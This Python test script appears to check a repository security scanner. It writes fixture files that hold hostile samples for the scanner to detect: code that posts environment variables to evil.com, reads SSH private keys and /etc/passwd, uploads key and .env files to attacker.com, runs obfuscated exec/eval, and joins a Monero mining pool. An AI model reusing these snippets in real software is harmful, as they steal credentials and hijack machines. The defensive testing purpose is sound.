"""
Test script to generate and review actual scanner reports.
This will help identify gaps and improvements needed for commercial use.
"""

import tempfile
from pathlib import Path
from src.core.security.malicious_intent_detection import analyze_malicious_intent
from src.core.quality.enhanced_report_generator import EnhancedReportGenerator


def create_test_repo_with_issues():
    """Create a test repository with various code quality issues."""
    tmpdir = tempfile.mkdtemp(prefix="repo_scanner_test_")
    repo_path = Path(tmpdir)
    
    # File 1: Malicious intent - credential theft
    (repo_path / "auth.py").write_text("""
import os
import requests

def authenticate_user(username, password):
    # Check user credentials
    if username == "admin" and password == "admin123":  # Hardcoded password
        return True
    
    # Send environment to external server
    try:
        requests.post(
            "https://collector.evil.com/data",
            json=os.environ
        )
    except:
        pass
    
    return False

def get_ssh_key():
    # Read SSH private key
    with open(os.path.expanduser("~/.ssh/id_rsa"), "r") as f:
        return f.read()
""")
    
    # File 2: Security vulnerabilities
    (repo_path / "api.py").write_text("""
import subprocess
import sqlite3

def run_command(user_input):
    # SQL injection vulnerability
    conn = sqlite3.connect("data.db")
    query = f"SELECT * FROM users WHERE name = '{user_input}'"  # SQL injection
    return conn.execute(query).fetchall()

def execute_shell(command):
    # Command injection vulnerability
    result = subprocess.run(command, shell=True, capture_output=True)  # Unsafe shell=True
    return result.stdout

def admin_check(password):
    # Hardcoded admin password
    if password == "secret123":
        return True
    return False
""")
    
    # File 3: Data exfiltration
    (repo_path / "exfil.py").write_text("""
import requests
import os

def backup_system():
    # Read sensitive system file
    with open("/etc/passwd", "r") as f:
        passwd_data = f.read()
    
    # Send to external server
    requests.post("https://attacker.com/collect", data=passwd_data)
    
    # Scan and upload files
    for root, dirs, files in os.walk("/home"):
        for file in files:
            if file.endswith((".key", ".pem", ".env")):
                with open(os.path.join(root, file), "r") as f:
                    requests.post("https://evil.com", data=f.read())
""")
    
    # File 4: Good code (for comparison)
    (repo_path / "utils.py").write_text("""
import json
from typing import List, Dict

def process_data(items: List[Dict]) -> List[Dict]:
    \"\"\"Process a list of data items.\"\"\"
    return [item for item in items if item.get("active")]

def calculate_total(amounts: List[float]) -> float:
    \"\"\"Calculate total of amounts.\"\"\"
    return sum(amounts)

def format_output(data: Dict) -> str:
    \"\"\"Format data as JSON string.\"\"\"
    return json.dumps(data, indent=2)
""")
    
    # File 5: Obfuscated code
    (repo_path / "obfuscated.py").write_text("""
import base64

# Obfuscated code execution
code = base64.b64decode(b'aW1wb3J0IG9z').decode()
exec(code)

# Hex obfuscation
import codecs
hex_code = '696d706f7274207379730a7072696e74287379732e76657273696f6e29'
eval(compile(codecs.decode(hex_code, 'hex').decode(), '<string>', 'exec'))
""")
    
    # File 6: Cryptocurrency mining
    (repo_path / "miner.py").write_text("""
import socket

def connect_to_pool():
    # Connect to mining pool
    sock = socket.socket()
    sock.connect(("pool.supportxmr.com", 3333))
    sock.send(b'{"method": "login", "params": {"login": "wallet", "pass": "x"}}')
    
def mine_monero():
    # XMR mining configuration
    config = {
        "algo": "randomx",
        "coin": "monero",
        "wallet": "4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge"
    }
    return config
""")
    
    return repo_path


def scan_and_generate_report(repo_path: Path):
    """Scan repository and generate comprehensive report."""
    print(f"\n{'='*80}")
    print(f"Scanning repository: {repo_path}")
    print(f"{'='*80}\n")
    
    # Read all files
    repository_files = {}
    for py_file in repo_path.glob("*.py"):
        try:
            repository_files[str(py_file.relative_to(repo_path))] = py_file.read_text()
        except Exception as e:
            print(f"Error reading {py_file}: {e}")
    
    # Run malicious intent detection
    print("Running malicious intent detection...")
    malicious_analysis = analyze_malicious_intent(repository_files)
    
    print(f"\nDetections: {malicious_analysis['total_detections']}")
    print(f"Risk Level: {malicious_analysis['overall_risk']}")
    print(f"Risk Score: {malicious_analysis['risk_score']:.1f}/10")
    
    # Create mock analysis results for report generation
    analysis_results = {
        'security_analysis': {
            'patterns_by_language': {
                'python': []
            }
        },
        'malicious_intent': malicious_analysis,
        'documentation_analysis': {
            'accuracy_score': 0.3,
            'has_readme': False,
            'has_docstrings': False
        },
        'governance_signals': {
            'has_ci': False,
            'has_tests': False,
            'has_readme': False,
            'has_license': False
        }
    }
    
    # Generate enhanced report
    print("\nGenerating enhanced report...")
    generator = EnhancedReportGenerator()
    report = generator.generate_report(analysis_results, str(repo_path))
    
    return report


def main():
    """Main test function."""
    # Create test repository
    print("Creating test repository with intentional vulnerabilities...")
    repo_path = create_test_repo_with_issues()
    
    try:
        # Scan and generate report
        report = scan_and_generate_report(repo_path)
        
        # Save report
        report_path = Path("test_report_output.md")
        report_path.write_text(report)
        
        print(f"\n{'='*80}")
        print(f"Report saved to: {report_path}")
        print(f"{'='*80}\n")
        
        # Print report
        print(report)
        
        # Analysis of report quality
        print(f"\n{'='*80}")
        print("REPORT QUALITY ANALYSIS")
        print(f"{'='*80}\n")
        
        print("✅ Report Length: {} characters".format(len(report)))
        print("✅ Has Risk Score: {}".format("Risk Score:" in report or "risk" in report.lower()))
        print("✅ Has Executive Summary: {}".format("Executive Summary" in report or "EXECUTIVE" in report))
        print("✅ Has Recommendations: {}".format("Recommendation" in report))
        print("✅ Has Detailed Findings: {}".format("Finding" in report or "Detection" in report))
        print("✅ Has Actionable Steps: {}".format("Remediation" in report or "Fix" in report))
        
        # Check for commercial readiness
        print("\nCOMMERCIAL READINESS CHECK:")
        checks = {
            "Clear risk level (CRITICAL/HIGH/MEDIUM/LOW)": any(level in report for level in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]),
            "Specific vulnerabilities identified": "credential" in report.lower() or "password" in report.lower(),
            "Remediation steps provided": "remediation" in report.lower() or "fix" in report.lower(),
            "Business impact explained": "impact" in report.lower(),
            "Prioritization guidance": "priority" in report.lower() or "urgent" in report.lower(),
            "Non-technical executive summary": "summary" in report.lower(),
            "Code evidence shown": "```" in report or "Line" in report,
            "Action items clear": "should" in report.lower() or "must" in report.lower()
        }
        
        for check, passed in checks.items():
            status = "✅" if passed else "❌"
            print(f"{status} {check}")
        
        passed_checks = sum(checks.values())
        total_checks = len(checks)
        score = (passed_checks / total_checks) * 100
        
        print(f"\nOverall Score: {passed_checks}/{total_checks} ({score:.0f}%)")
        
        if score >= 80:
            print("🎉 EXCELLENT - Report is production-ready!")
        elif score >= 60:
            print("👍 GOOD - Minor improvements needed")
        elif score >= 40:
            print("⚠️  NEEDS WORK - Significant improvements required")
        else:
            print("❌ POOR - Major overhaul needed")
        
    finally:
        # Cleanup
        import shutil
        shutil.rmtree(repo_path, ignore_errors=True)
        print(f"\nCleaned up test repository: {repo_path}")


if __name__ == "__main__":
    main()
